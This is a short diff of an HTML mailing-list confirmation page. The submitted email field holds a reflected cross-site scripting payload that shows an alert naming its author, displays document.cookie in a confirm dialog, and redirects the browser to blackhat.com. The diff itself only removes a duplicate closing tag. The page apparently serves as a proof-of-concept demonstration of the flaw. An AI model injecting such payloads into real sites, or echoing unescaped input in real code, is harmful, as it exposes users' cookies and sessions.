@@ -13,5 +13,5 @@
 Thank you for subscription!<br>
 Email <b><script> alert('This is XSS is crafted by Pravin Shinde'); if (window.confirm(document.cookie)){ document.location.href = "http://blackhat.com"; } </script></b> added to mailing list!
 </body>
-</html>
+
 </html>
